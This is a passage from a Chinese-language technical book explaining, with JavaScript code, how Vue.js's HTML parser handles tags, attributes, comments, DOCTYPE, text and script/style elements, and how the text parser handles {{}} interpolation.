&#x2F;^\\s*([^\\s&quot;&#x27;&lt;&gt;\\&#x2F;=]+)(?:\\s*(=)\\s*(?:&quot;([^&quot;]*)&quot;+|&#x27;([^&#x27;]*)&#x27;+|([^\\s&quot;&#x27;=&lt;&gt;&#96;]+)))?&#x2F;\nlet html = &#x27; class=&quot;box&quot; id=&quot;el&quot;&gt;&lt;&#x2F;div&gt;&#x27;\nlet end, attr\nconst match = {tagName: &#x27;div&#x27;, attrs: []}\n\nwhile (!(end = html.match(startTagClose)) &amp;&amp; (attr = html.match(attribute))) {\n    html = html.substring(attr[0].length)\n    match.attrs.push(attr)\n}\n</code></pre><p>上面这段代码的意思是，如果剩余HTML模板不符合开始标签结尾部分的特征，并且符合标签属性的特征，那么进入到循环中进行解析与截取操作。</p>\n<p>通过<code>match</code>方法解析出的结果为：</p>\n<pre class=\"prettyprint language-javascript\"><code>{\n    tagName: &#x27;div&#x27;,\n    attrs: [\n        [&#x27; class=&quot;box&quot;&#x27;, &#x27;class&#x27;, &#x27;=&#x27;, &#x27;box&#x27;, null, null],\n        [&#x27; id=&quot;el&quot;&#x27;, &#x27;id&#x27;,&#x27;=&#x27;, &#x27;el&#x27;, null, null]\n    ]\n}\n</code></pre><p>可以看到，标签中的两个属性都已经解析好并且保存在了<code>attrs</code>中。</p>\n<p>此时剩余模板是下面的样子：</p>\n<pre class=\"prettyprint language-javascript\"><code>&quot;&gt;&lt;&#x2F;div&gt;&quot;\n</code></pre><p>我们将属性解析后的模板与解析之前的模板进行对比：</p>\n<pre class=\"prettyprint language-javascript\"><code>&#x2F;&#x2F; 解析前的模板\n&#x27; class=&quot;box&quot; id=&quot;el&quot;&gt;&lt;&#x2F;div&gt;&#x27;\n\n&#x2F;&#x2F; 解析后的模板\n&#x27;&gt;&lt;&#x2F;div&gt;&#x27;\n\n&#x2F;&#x2F; 解析前的数据\n{\n    tagName: &#x27;div&#x27;,\n    attrs: []\n}\n\n&#x2F;&#x2F; 解析后的数据\n{\n    tagName: &#x27;div&#x27;,\n    attrs: [\n        [&#x27; class=&quot;box&quot;&#x27;, &#x27;class&#x27;, &#x27;=&#x27;, &#x27;box&#x27;, null, null],\n        [&#x27; id=&quot;el&quot;&#x27;, &#x27;id&#x27;,&#x27;=&#x27;, &#x27;el&#x27;, null, null]\n    ]\n}\n</code></pre><p>可以看到，标签上的所有属性都已经被成功解析出来，并保存在<code>attrs</code>属性中。</p>\n<h4>2. 解析自闭合标识</h4>\n<p>如果我们接着上面的例子继续解析的话，目前剩余的模板是下面这样的：</p>\n<pre class=\"prettyprint language-javascript\"><code>&#x27;&gt;&lt;&#x2F;div&gt;&#x27;\n</code></pre><p>开始标签中结尾部分解析的主要目的是解析出当前这个标签是否是自闭合标签。</p>\n<p>举个例子：</p>\n<pre class=\"prettyprint language-html\"><code>&lt;div&gt;&lt;&#x2F;div&gt;\n</code></pre><p>这样的<code>div</code>标签就不是自闭合标签，而下面这样的<code>input</code>标签就属于自闭合标签：</p>\n<pre class=\"prettyprint language-html\"><code>&lt;input type=&quot;text&quot; &#x2F;&gt;\n</code></pre><p>自闭合标签是没有子节点的，所以前文中我们提到构建AST层级时，需要维护一个栈，而一个节点是否需要推入到栈中，可以使用这个自闭合标识来判断。</p>\n<p>那么，如何解析开始标签中的结尾部分呢？看下面这段代码：</p>\n<pre class=\"prettyprint language-javascript\"><code>function parseStartTagEnd (html) {\n  const startTagClose = &#x2F;^\\s*(\\&#x2F;?)&gt;&#x2F;\n  const end = html.match(startTagClose)\n  const match = {}\n\n  if (end) {\n      match.unarySlash = end[1]\n      html = html.substring(end[0].length)\n      return match\n  }\n}\n\nconsole.log(parseStartTagEnd(&#x27;&gt;&lt;&#x2F;div&gt;&#x27;)) &#x2F;&#x2F; {unarySlash: &quot;&quot;}\nconsole.log(parseStartTagEnd(&#x27;&#x2F;&gt;&lt;div&gt;&lt;&#x2F;div&gt;&#x27;)) &#x2F;&#x2F; {unarySlash: &quot;&#x2F;&quot;}\n</code></pre><p>这段代码可以正确解析出开始标签是否是自闭合标签。</p>\n<p>从代码中打印出来的结果可以看到，自闭合标签解析后的<code>unarySlash</code>属性为<code>/</code>，而非自闭合标签为空字符串。</p>\n<h4>3. 实现源码</h4>\n<p>前面解析开始标签时，我们将其拆解成了三个部分，分别是标签名、属性和结尾。我相信你已经对开始标签的解析有了一个清晰的认识，接下来看一下Vue.js中真实的代码是什么样的：</p>\n<pre class=\"prettyprint language-javascript\"><code>const ncname = &#x27;[a-zA-Z_][\\\\w\\\\-\\\\.]*&#x27;\nconst qnameCapture = &#96;((?:${ncname}\\\\:)?${ncname})&#96;\nconst startTagOpen = new RegExp(&#96;^&lt;${qnameCapture}&#96;)\nconst startTagClose = &#x2F;^\\s*(\\&#x2F;?)&gt;&#x2F;\n\nfunction advance (n) {\n    html = html.substring(n)\n}\n\nfunction parseStartTag () {\n    &#x2F;&#x2F; 解析标签名，判断模板是否符合开始标签的特征\n    const start = html.match(startTagOpen)\n    if (start) {\n        const match = {\n            tagName: start[1],\n            attrs: []\n        }\n        advance(start[0].length)\n        \n        &#x2F;&#x2F; 解析标签属性\n        let end, attr\n        while (!(end = html.match(startTagClose)) &amp;&amp; (attr = html.match(attribute))) {\n            advance(attr[0].length)\n            match.attrs.push(attr)\n        }\n        \n        &#x2F;&#x2F; 判断是否是自闭合标签\n        if (end) {\n            match.unarySlash = end[1]\n            advance(end[0].length)\n            return match\n        }\n    }\n}\n</code></pre><p>上面的代码是Vue.js中解析开始标签的源码，这段代码中的<code>html</code>变量是HTML模板。</p>\n<p>调用<code>parseStartTag</code>就可以将剩余模板开始部分的开始标签解析出来。如果剩余HTML模板的开始部分不符合开始标签的正则表达式规则，那么调用<code>parseStartTag</code>就会返回<code>undefined</code>。因此，判断剩余模板是否符合开始标签的规则，只需要调用<code>parseStartTag</code>即可。如果调用它后得到了解析结果，那么说明剩余模板的开始部分符合开始标签的规则，此时将解析出来的结果取出来并调用钩子函数<code>start</code>即可：</p>\n<pre class=\"prettyprint language-javascript\"><code>&#x2F;&#x2F; 开始标签\nconst startTagMatch = parseStartTag()\nif (startTagMatch) {\n    handleStartTag(startTagMatch)\n    continue\n}\n</code></pre><p>前面我们说过，所有解析操作都运行在循环中，所以<code>continue</code>的意思是这一轮的解析工作已经完成，可以进行下一轮解析工作。</p>\n<p>从代码中可以看出，如果调用<code>parseStartTag</code>之后有返回值，那么会进行开始标签的处理，其处理逻辑主要在<code>handleStartTag</code>中。这个函数的主要目的就是将<code>tagName</code>、<code>attrs</code>和<code>unary</code>等数据取出来，然后调用钩子函数将这些数据放到参数中。</p>\n<h3>9.3.3 截取结束标签</h3>\n<p>结束标签的截取要比开始标签简单得多，因为它不需要解析什么，只需要分辨出当前是否已经截取到结束标签，如果是，那么触发钩子函数就可以了。</p>\n<p>那么，如何分辨模板已经截取到结束标签了呢？其道理其实和开始标签的截取相同。</p>\n<p>如果HTML模板的第一个字符不是<code>&lt;</code>，那么一定不是结束标签。只有HTML模板的第一个字符是<code>&lt;</code>时，我们才需要进一步确认它到底是不是结束标签。</p>\n<p>进一步确认时，我们只需要判断剩余HTML模板的开始位置是否符合正则表达式中定义的规则即可：</p>\n<pre class=\"prettyprint language-javascript\"><code>const ncname = &#x27;[a-zA-Z_][\\\\w\\\\-\\\\.]*&#x27;\nconst qnameCapture = &#96;((?:${ncname}\\\\:)?${ncname})&#96;\nconst endTag = new RegExp(&#96;^&lt;\\\\&#x2F;${qnameCapture}[^&gt;]*&gt;&#96;)\n\nconst endTagMatch = &#x27;&lt;&#x2F;div&gt;&#x27;.match(endTag)\nconst endTagMatch2 = &#x27;&lt;div&gt;&#x27;.match(endTag)\n\nconsole.log(endTagMatch) &#x2F;&#x2F; [&quot;&lt;&#x2F;div&gt;&quot;, &quot;div&quot;, index: 0, input: &quot;&lt;&#x2F;div&gt;&quot;]\nconsole.log(endTagMatch2) &#x2F;&#x2F; null\n</code></pre><p>上面代码可以分辨出剩余模板是否是结束标签。当分辨出结束标签后，需要做两件事，一件事是截取模板，另一件事是触发钩子函数。而Vue.js中相关源码被精简后如下：</p>\n<pre class=\"prettyprint language-javascript\"><code>const endTagMatch = html.match(endTag)\nif (endTagMatch) {\n    html = html.substring(endTagMatch[0].length)\n    options.end(endTagMatch[1])\n    continue\n}\n</code></pre><p>可以看出，先对模板进行截取，然后触发钩子函数。</p>\n<h3>9.3.4 截取注释</h3>\n<p>分辨模板是否已经截取到注释的原理与开始标签和结束标签相同，先判断剩余HTML模板的第一个字符是不是<code>&lt;</code>，如果是，再用正则表达式来进一步匹配：</p>\n<pre class=\"prettyprint language-javascript\"><code>const comment = &#x2F;^&lt;!--&#x2F;\n\nif (comment.test(html)) {\n    const commentEnd = html.indexOf(&#x27;--&gt;&#x27;)\n\n    if (commentEnd &gt;= 0) {\n        if (options.shouldKeepComment) {\n            options.comment(html.substring(4, commentEnd))\n        }\n        html = html.substring(commentEnd + 3)\n        continue\n    }\n}\n</code></pre><p>在上面的代码中，我们使用正则表达式来判断剩余的模板是否符合注释的规则，如果符合，就将这段注释文本截取出来。</p>\n<p>这里有一个有意思的地方，那就是注释的钩子函数可以通过选项来配置，只有<code>options.shouldKeepComment</code>为真时，才会触发钩子函数，否则只截取模板，不触发钩子函数。</p>\n<h3>9.3.5 截取条件注释</h3>\n<p>条件注释不需要触发钩子函数，我们只需要把它截取掉就行了。</p>\n<p>截取条件注释的原理与截取注释非常相似，如果模板的第一个字符是<code>&lt;</code>，并且符合我们事先用正则表达式定义好的规则，就说明需要进行条件注释的截取操作。</p>\n<p>在下面的代码中，我们通过<code>indexOf</code>找到条件注释结束位置的下标，然后将结束位置前的字符都截取掉：</p>\n<pre class=\"prettyprint language-javascript\"><code>const conditionalComment = &#x2F;^&lt;!\\[&#x2F;\nif (conditionalComment.test(html)) {\n    const conditionalEnd = html.indexOf(&#x27;]&gt;&#x27;)\n\n    if (conditionalEnd &gt;= 0) {\n        html = html.substring(conditionalEnd + 2)\n        continue\n    }\n}\n</code></pre><p>我们来举个例子：</p>\n<pre class=\"prettyprint language-javascript\"><code>const conditionalComment = &#x2F;^&lt;!\\[&#x2F;\nlet html = &#x27;&lt;![if !IE]&gt;&lt;link href=&quot;non-ie.css&quot; rel=&quot;stylesheet&quot;&gt;&lt;![endif]&gt;&#x27;\nif (conditionalComment.test(html)) {\n    const conditionalEnd = html.indexOf(&#x27;]&gt;&#x27;)\n    if (conditionalEnd &gt;= 0) {\n        html = html.substring(conditionalEnd + 2)\n    }\n}\n\nconsole.log(html) &#x2F;&#x2F; &#x27;&lt;link href=&quot;non-ie.css&quot; rel=&quot;stylesheet&quot;&gt;&lt;![endif]&gt;&#x27;\n</code></pre><p>从打印结果中可以看到，HTML中的条件注释部分截取掉了。</p>\n<p>通过这个逻辑可以发现，在Vue.js中条件注释其实没有用，写了也会被截取掉，通俗一点说就是写了也白写。</p>\n<h3>9.3.6 截取<code>DOCTYPE</code></h3>\n<p><code>DOCTYPE</code>与条件注释相同，都是不需要触发钩子函数的，只需要将匹配到的这一段字符截取掉即可。下面的代码将<code>DOCTYPE</code>这段字符匹配出来后，根据它的<code>length</code>属性来决定要截取多长的字符串：</p>\n<pre class=\"prettyprint language-javascript\"><code>const doctype = &#x2F;^&lt;!DOCTYPE [^&gt;]+&gt;&#x2F;i\nconst doctypeMatch = html.match(doctype)\nif (doctypeMatch) {\n    html = html.substring(doctypeMatch[0].length)\n    continue\n}\n</code></pre><p>示例如下：</p>\n<pre class=\"prettyprint language-javascript\"><code>const doctype = &#x2F;^&lt;!DOCTYPE [^&gt;]+&gt;&#x2F;i\nlet html = &#x27;&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;&lt;&#x2F;head&gt;&lt;body&gt;&lt;&#x2F;body&gt;&lt;&#x2F;html&gt;&#x27;\nconst doctypeMatch = html.match(doctype)\nif (doctypeMatch) {\n    html = html.substring(doctypeMatch[0].length)\n}\n\nconsole.log(html) &#x2F;&#x2F; &#x27;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;&lt;&#x2F;head&gt;&lt;body&gt;&lt;&#x2F;body&gt;&lt;&#x2F;html&gt;&#x27;\n</code></pre><p>从打印结果可以看到，HTML中的<code>DOCTYPE</code>被成功截取掉了。</p>\n<h3>9.3.7 截取文本</h3>\n<p>若想分辨在本轮循环中HTML模板是否已经截取到文本，其实很简单，我们甚至不需要使用正则表达式。</p>\n<p>在前面的其他标签类型中，我们都会判断剩余HTML模板的第一个字符是否是<code>&lt;</code>，如果是，再进一步确认到底是哪种类型。这是因为以<code>&lt;</code>开头的标签类型太多了，如开始标签、结束标签和注释等。然而文本只有一种，如果HTML模板的第一个字符不是<code>&lt;</code>，那么它一定是文本了。</p>\n<p>例如：</p>\n<pre class=\"prettyprint language-html\"><code>我是文本&lt;&#x2F;div&gt;\n</code></pre><p>上面这段HTML模板并不是以<code>&lt;</code>开头的，所以可以断定它是以文本开头的。</p>\n<p>那么，如何从模板中将文本解析出来呢？我们只需要找到下一个<code>&lt;</code>在什么位置，这之前的所有字符都属于文本，如图9-4所示。</p>\n<p><img src=\"http://p4.qhimg.com/t01fb2546eafa16179e.jpg\" alt=\"尖括号前面的字符都属于文本\">\n图9-4 尖括号前面的字符都属于文本</p>\n<p>在代码中可以这样实现：</p>\n<pre class=\"prettyprint language-javascript\"><code>while (html) {\n    let text\n    let textEnd = html.indexOf(&#x27;&lt;&#x27;)\n    \n    &#x2F;&#x2F; 截取文本\n    if (textEnd &gt;= 0) {\n        text = html.substring(0, textEnd)\n        html = html.substring(textEnd)\n    }\n\n    &#x2F;&#x2F; 如果模板中找不到&lt;，就说明整个模板都是文本\n    if (textEnd &lt; 0) {\n        text = html\n        html = &#x27;&#x27;\n    }\n\n    &#x2F;&#x2F; 触发钩子函数\n    if (options.chars &amp;&amp; text) {\n        options.chars(text)\n    }\n}\n</code></pre><p>上面的代码共有三部分逻辑。</p>\n<p>第一部分是截取文本，这在前面介绍过了。<code>&lt;</code>之前的所有字符都是文本，直接使用<code>html.substring</code>从模板的最开始位置截取到<code>&lt;</code>之前的位置，就可以将文本截取出来。</p>\n<p>第二部分是一个条件：如果在整个模板中都找不到<code>&lt;</code>，那么说明整个模板全是文本。</p>\n<p>第三部分是触发钩子函数并将截取出来的文本放到参数中。</p>\n<p>关于文本，还有一个特殊情况需要处理：如果<code>&lt;</code>是文本的一部分，该如何处理？</p>\n<p>举个例子：</p>\n<pre class=\"prettyprint language-html\"><code>1&lt;2&lt;&#x2F;div&gt;\n</code></pre><p>在上面这样的模板中，如果只截取第一个<code>&lt;</code>前面的字符，最后被截取出来的将只有1，而不能把所有文本都截取出来。</p>\n<p>那么，该如何解决这个问题呢？</p>\n<p>有一个思路是，如果将<code>&lt;</code>前面的字符截取完之后，剩余的模板不符合任何需要被解析的片段的类型，就说明这个<code>&lt;</code>是文本的一部分。</p>\n<p>什么是需要被解析的片段的类型？在9.3.1节中，我们说过HTML解析器是一段一段截取模板的，而被截取的每一段都符合某种类型，这些类型包括开始标签、结束标签和注释等。</p>\n<p>说的再具体一点，那就是上面这段代码中的1被截取完之后，剩余模板是下面的样子：</p>\n<pre class=\"prettyprint language-html\"><code>&lt;2&lt;&#x2F;div&gt;\n</code></pre><p><code>&lt;2</code>符合开始标签的特征么？不符合。</p>\n<p><code>&lt;2</code>符合结束标签的特征么？不符合。</p>\n<p><code>&lt;2</code>符合注释的特征么？不符合。</p>\n<p>当剩余的模板什么都不符合时，就说明<code>&lt;</code>属于文本的一部分。</p>\n<p>当判断出<code>&lt;</code>是属于文本的一部分后，我们需要做的事情是找到下一个<code>&lt;</code>并将其前面的文本截取出来加到前面截取了一半的文本后面。</p>\n<p>这里还用上面的例子，第二个<code>&lt;</code>之前的字符是<code>&lt;2</code>，那么把<code>&lt;2</code>截取出来后，追加到上一次截取出来的<code>1</code>的后面，此时的结果是：</p>\n<pre class=\"prettyprint language-html\"><code>1&lt;2\n</code></pre><p>截取后剩余的模板是：</p>\n<pre class=\"prettyprint language-html\"><code>&lt;&#x2F;div&gt;\n</code></pre><p>如果剩余的模板依然不符合任何被解析的类型，那么重复此过程。直到所有文本都解析完。</p>\n<p>说完了思路，我们看一下具体的实现，伪代码如下：</p>\n<pre class=\"prettyprint language-javascript\"><code>while (html) {\n    let text, rest, next\n    let textEnd = html.indexOf(&#x27;&lt;&#x27;)\n    \n    &#x2F;&#x2F; 截取文本\n    if (textEnd &gt;= 0) {\n        rest = html.slice(textEnd)\n        while (\n            !endTag.test(rest) &amp;&amp;\n            !startTagOpen.test(rest) &amp;&amp;\n            !comment.test(rest) &amp;&amp;\n            !conditionalComment.test(rest)\n        ) {\n            &#x2F;&#x2F; 如果&#x27;&lt;&#x27;在纯文本中，将它视为纯文本对待\n            next = rest.indexOf(&#x27;&lt;&#x27;, 1)\n            if (next &lt; 0) break\n            textEnd += next\n            rest = html.slice(textEnd)\n        }\n        text = html.substring(0, textEnd)\n        html = html.substring(textEnd)\n    }\n    \n    &#x2F;&#x2F; 如果模板中找不到&lt;，那么说明整个模板都是文本\n    if (textEnd &lt; 0) {\n        text = html\n        html = &#x27;&#x27;\n    }\n    \n    &#x2F;&#x2F; 触发钩子函数\n    if (options.chars &amp;&amp; text) {\n        options.chars(text)\n    }\n}\n</code></pre><p>在代码中，我们通过<code>while</code>来解决这个问题（注意是里面的<code>while</code>）。如果剩余的模板不符合任何被解析的类型，那么重复解析文本，直到剩余模板符合被解析的类型为止。</p>\n<p>在上面的代码中，<code>endTag</code>、<code>startTagOpen</code>、<code>comment</code>和<code>conditionalComment</code>都是正则表达式，分别匹配结束标签、开始标签、注释和条件注释。</p>\n<p>在Vue.js源码中，截取文本的逻辑和其他的实现思路一致。</p>\n<h3>9.3.8 纯文本内容元素的处理</h3>\n<p>什么是纯文本内容元素呢？<code>script</code>、<code>style</code>和<code>textarea</code>这三种元素叫作纯文本内容元素。解析它们的时候，会把这三种标签内包含的所有内容都当作文本处理。那么，具体该如何处理呢？</p>\n<p>前面介绍开始标签、结束标签、文本、注释的截取时，其实都是默认当前需要截取的元素的父级元素不是<strong>纯文本内容元素</strong>。事实上，如果要截取元素的父级元素是纯文本内容元素的话，处理逻辑将完全不一样。</p>\n<p>事实上，在<code>while</code>循环中，最外层的判断条件就是父级元素是不是纯文本内容元素。例如下面的伪代码：</p>\n<pre class=\"prettyprint language-javascript\"><code>while (html) {\n    if (!lastTag || !isPlainTextElement(lastTag)) {\n        &#x2F;&#x2F; 父元素为正常元素的处理逻辑\n    } else {\n        &#x2F;&#x2F; 父元素为script、style、textarea的处理逻辑\n    }\n}\n</code></pre><p>在上面的代码中，<code>lastTag</code>代表父元素。可以看到，在<code>while</code>中，首先进行判断，如果父元素不存在或者不是纯文本内容元素，那么进行正常的处理逻辑，也就是前面介绍的逻辑。</p>\n<p>而当父元素是<code>script</code>这种纯文本内容元素时，会进入到<code>else</code>这个语句里面。由于纯文本内容元素都被视作文本处理，所以我们的处理逻辑就变得很简单，只需要把这些文本截取出来并触发钩子函数<code>chars</code>，然后再将结束标签截取出来并触发钩子函数<code>end</code>。</p>\n<p>也就是说，如果父标签是纯文本内容元素，那么本轮循环会一次性将这个父标签给处理完毕。</p>\n<p>伪代码如下：</p>\n<pre class=\"prettyprint language-javascript\"><code>while (html) {\n    if (!lastTag || !isPlainTextElement(lastTag)) {\n        &#x2F;&#x2F; 父元素为正常元素的处理逻辑\n    } else {\n        &#x2F;&#x2F; 父元素为script、style、textarea的处理逻辑\n        const stackedTag = lastTag.toLowerCase()\n        const reStackedTag = reCache[stackedTag] || (reCache[stackedTag] = new RegExp(&#x27;([\\\\s\\\\S]*?)(&lt;&#x2F;&#x27; + stackedTag + &#x27;[^&gt;]*&gt;)&#x27;, &#x27;i&#x27;))\n        const rest = html.replace(reStackedTag, function (all, text) {\n            if (options.chars) {\n                options.chars(text)\n            }\n            return &#x27;&#x27;\n        })\n        html = rest\n        options.end(stackedTag)\n    }\n}\n</code></pre><p>上面代码中的正则表达式可以匹配结束标签前包括结束标签自身在内的所有文本。</p>\n<p>我们可以给<code>replace</code>方法的第二个参数传递一个函数。在这个函数中，我们得到了参数<code>text</code>（代表结束标签前的所有内容），触发了钩子函数<code>chars</code>并把<code>text</code>放到钩子函数的参数中传出去。最后，返回了一个空字符串，代表将匹配到的内容都截掉了。注意，这里的截掉会将内容和结束标签一起截取掉。</p>\n<p>最后，调用钩子函数<code>end</code>并将标签名放到参数中传出去，代表本轮循环中的所有逻辑都已处理完毕。</p>\n<p>假如我们现在有这样一个模板：</p>\n<pre class=\"prettyprint language-html\"><code>&lt;div id=&quot;el&quot;&gt;\n    &lt;script&gt;console.log(1)&lt;&#x2F;script&gt;\n&lt;&#x2F;div&gt;\n</code></pre><p>当解析到<code>script</code>中的内容时，模板是下面的样子：</p>\n<pre class=\"prettyprint language-html\"><code>console.log(1)&lt;&#x2F;script&gt;\n&lt;&#x2F;div&gt;\n</code></pre><p>此时父元素为<code>script</code>，所以会进入到<code>else</code>中的逻辑进行处理。在其处理过程中，会触发钩子函数<code>chars</code>和<code>end</code>。</p>\n<p>钩子函数<code>chars</code>的参数为<code>script</code>中的所有内容，本例中大概是下面的样子：</p>\n<pre class=\"prettyprint language-javascript\"><code>chars(&#x27;console.log(1)&#x27;)\n</code></pre><p>钩子函数<code>end</code>的参数为标签名，本例中是<code>script</code>。</p>\n<p>处理后的剩余模板如下：</p>\n<pre class=\"prettyprint language-html\"><code>\n&lt;&#x2F;div&gt;\n</code></pre><h3>9.3.9 使用栈维护DOM层级</h3>\n<p>通过前面几节的介绍，特别是9.3.8节中的介绍，你一定会感到很奇怪，如何知道父元素是谁？</p>\n<p>在前面几节中，我们并没有介绍HTML解析器内部其实也有一个栈来维护DOM层级关系，其逻辑与9.2.1节相同：就是每解析到开始标签，就向栈中推进去一个；每解析到标签结束，就弹出来一个。因此，想取到父元素并不难，只需要拿到栈中的最后一项即可。</p>\n<p>同时，HTML解析器中的栈还有另一个作用，它可以检测出HTML标签是否正确闭合。例如：</p>\n<pre class=\"prettyprint language-html\"><code>&lt;div&gt;&lt;p&gt;&lt;&#x2F;div&gt;\n</code></pre><p>在上面的代码中，<code>p</code>标签忘记写结束标签，那么当HTML解析器解析到<code>div</code>的结束标签时，栈顶的元素却是<code>p</code>标签。这个时候从栈顶向栈底循环找到<code>div</code>标签，在找到<code>div</code>标签之前遇到的所有其他标签都是忘记了闭合的标签，而Vue.js会在非生产环境下在控制台打印警告提示。</p>\n<p>关于使用栈来维护DOM层级关系的具体实现思路，9.2.1节已经详细介绍过，这里不再重复介绍。</p>\n<h3>9.3.10 整体逻辑</h3>\n<p>前面我们把开始标签、结束标签、注释、文本、纯文本内容元素等的截取方式拆分开，单独进行了详细介绍。本节中，我们就来介绍如何将这些解析方式组装起来完成HTML解析器的功能。</p>\n<p>首先，HTML解析器是一个函数。就像9.2节介绍的那样，HTML解析器最终的目的是实现这样的功能：</p>\n<pre class=\"prettyprint language-javascript\"><code>parseHTML(template, {\n    start (tag, attrs, unary) {\n        &#x2F;&#x2F; 每当解析到标签的开始位置时，触发该函数\n    },\n    end () {\n        &#x2F;&#x2F; 每当解析到标签的结束位置时，触发该函数\n    },\n    chars (text) {\n        &#x2F;&#x2F; 每当解析到文本时，触发该函数\n    },\n    comment (text) {\n        &#x2F;&#x2F; 每当解析到注释时，触发该函数\n    }\n})\n</code></pre><p>所以HTML解析器在实现上肯定是一个函数，它有两个参数——模板和选项：</p>\n<pre class=\"prettyprint language-javascript\"><code>export function parseHTML (html, options) {\n    &#x2F;&#x2F; 做点什么\n}\n</code></pre><p>我们的模板是一小段一小段去截取与解析的，所以需要一个循环来不断截取，直到全部截取完毕：</p>\n<pre class=\"prettyprint language-javascript\"><code>export function parseHTML (html, options) {\n    while (html) {\n        &#x2F;&#x2F; 做点什么\n    }\n}\n</code></pre><p>在循环中，首先要判断父元素是不是纯文本内容元素，因为不同类型父节点的解析方式将完全不同：</p>\n<pre class=\"prettyprint language-javascript\"><code>export function parseHTML (html, options) {\n    while (html) {\n        if (!lastTag || !isPlainTextElement(lastTag)) {\n            &#x2F;&#x2F; 父元素为正常元素的处理逻辑\n        } else {\n            &#x2F;&#x2F; 父元素为script、style、textarea的处理逻辑\n        }\n    }\n}\n</code></pre><p>在上面的代码中，我们发现这里已经把整体逻辑分成了两部分，一部分是父标签是正常标签的逻辑，另一部分是父标签是<code>script</code>、<code>style</code>、<code>textarea</code>这种纯文本内容元素的逻辑。</p>\n<p>如果父标签为正常的元素，那么有几种情况需要分别处理，比如需要分辨出当前要解析的一小段模板到底是什么类型。是开始标签？还是结束标签？又或者是文本？</p>\n<p>我们把所有需要处理的情况都列出来，有下面几种情况：</p>\n<ul>\n<li>文本</li>\n<li>注释</li>\n<li>条件注释</li>\n<li><code>DOCTYPE</code></li>\n<li>结束标签</li>\n<li>开始标签</li>\n</ul>\n<p>我们会发现，在这些需要处理的类型中，除了文本之外，其他都是以标签形式存在的，而标签是以<code>&lt;</code>开头的。</p>\n<p>所以逻辑就很清晰了，我们先根据<code>&lt;</code>来判断需要解析的字符是文本还是其他的：</p>\n<pre class=\"prettyprint language-javascript\"><code>export function parseHTML (html, options) {\n    while (html) {\n        if (!lastTag || !isPlainTextElement(lastTag)) {\n            let textEnd = html.indexOf(&#x27;&lt;&#x27;)\n            if (textEnd === 0) {\n                &#x2F;&#x2F; 做点什么\n            }\n            \n            let text, rest, next\n            if (textEnd &gt;= 0) {\n                &#x2F;&#x2F; 解析文本\n            }\n            \n            if (textEnd &lt; 0) {\n                text = html\n                html = &#x27;&#x27;\n            }\n            \n            if (options.chars &amp;&amp; text) {\n                options.chars(text)\n            }\n        } else {\n            &#x2F;&#x2F; 父元素为script、style、textarea的处理逻辑\n        }\n    }\n}\n</code></pre><p>在上面的代码中，我们可以通过<code>&lt;</code>来分辨是否需要进行文本解析。关于文本解析的内容，详见9.3.7节。</p>\n<p>如果通过<code>&lt;</code>分辨出即将解析的这一小部分字符不是文本而是标签类，那么标签类有那么多类型，我们需要进一步分辨具体是哪种类型：</p>\n<pre class=\"prettyprint language-javascript\"><code>export function parseHTML (html, options) {\n    while (html) {\n        if (!lastTag || !isPlainTextElement(lastTag)) {\n            let textEnd = html.indexOf(&#x27;&lt;&#x27;)\n            if (textEnd === 0) {\n                &#x2F;&#x2F; 注释\n                if (comment.test(html)) {\n                    &#x2F;&#x2F; 注释的处理逻辑\n                    continue\n                }\n                \n                &#x2F;&#x2F; 条件注释\n                if (conditionalComment.test(html)) {\n                    &#x2F;&#x2F; 条件注释的处理逻辑\n                    continue\n                }\n                \n                &#x2F;&#x2F; DOCTYPE\n                const doctypeMatch = html.match(doctype)\n                if (doctypeMatch) {\n                    &#x2F;&#x2F; DOCTYPE的处理逻辑\n                    continue\n                }\n                \n                &#x2F;&#x2F; 结束标签\n                const endTagMatch = html.match(endTag)\n                if (endTagMatch) {\n                    &#x2F;&#x2F; 结束标签的处理逻辑\n                    continue\n                }\n                \n                &#x2F;&#x2F; 开始标签\n                const startTagMatch = parseStartTag()\n                if (startTagMatch) {\n                    &#x2F;&#x2F; 开始标签的处理逻辑\n                    continue\n                }\n            }\n            \n            let text, rest, next\n            if (textEnd &gt;= 0) {\n                &#x2F;&#x2F; 解析文本\n            }\n            \n            if (textEnd &lt; 0) {\n                text = html\n                html = &#x27;&#x27;\n            }\n            \n            if (options.chars &amp;&amp; text) {\n                options.chars(text)\n            }\n        } else {\n            &#x2F;&#x2F; 父元素为script、style、textarea的处理逻辑\n        }\n    }\n}\n</code></pre><p>关于不同类型的具体处理方式，前面已经详细介绍过，这里不再重复。</p>\n<h2>9.4 文本解析器</h2>\n<p>文本解析器的作用是解析文本。你可能会觉得很奇怪，文本不是在HTML解析器中被解析出来了么？准确地说，文本解析器是对HTML解析器解析出来的文本进行二次加工。为什么要进行二次加工？</p>\n<p>文本其实分两种类型，一种是纯文本，另一种是带变量的文本。例如下面这样的文本是纯文本：</p>\n<pre class=\"prettyprint language-html\"><code>Hello Berwin\n</code></pre><p>而下面这样的是带变量的文本：</p>\n<pre class=\"prettyprint language-html\"><code>Hello {{name}}\n</code></pre><p>在Vue.js模板中，我们可以使用变量来填充模板。而HTML解析器在解析文本时，并不会区分文本是否是带变量的文本。如果是纯文本，不需要进行任何处理；但如果是带变量的文本，那么需要使用文本解析器进一步解析。因为带变量的文本在使用虚拟DOM进行渲染时，需要将变量替换成变量中的值。</p>\n<p>我们在9.2节中介绍过，每当HTML解析器解析到文本时，都会触发<code>chars</code>函数，并且从参数中得到解析出的文本。在<code>chars</code>函数中，我们需要构建文本类型的AST，并将它添加到父节点的<code>children</code>属性中。</p>\n<p>而在构建文本类型的AST时，纯文本和带变量的文本是不同的处理方式。如果是带变量的文本，我们需要借助文本解析器对它进行二次加工，其代码如下：</p>\n<pre class=\"prettyprint language-javascript\"><code>parseHTML(template, {\n    start (tag, attrs, unary) {\n        &#x2F;&#x2F; 每当解析到标签的开始位置时，触发该函数\n    },\n    end () {\n        &#x2F;&#x2F; 每当解析到标签的结束位置时，触发该函数\n    },\n    chars (text) {\n        text = text.trim()\n        if (text) {\n            const children = currentParent.children\n            let expression\n            if (expression = parseText(text)) {\n                children.push({\n                    type: 2,\n                    expression,\n                    text\n                })\n            } else {\n                children.push({\n                    type: 3,\n                    text\n                })\n            }\n        }\n    },\n    comment (text) {\n        &#x2F;&#x2F; 每当解析到注释时，触发该函数\n    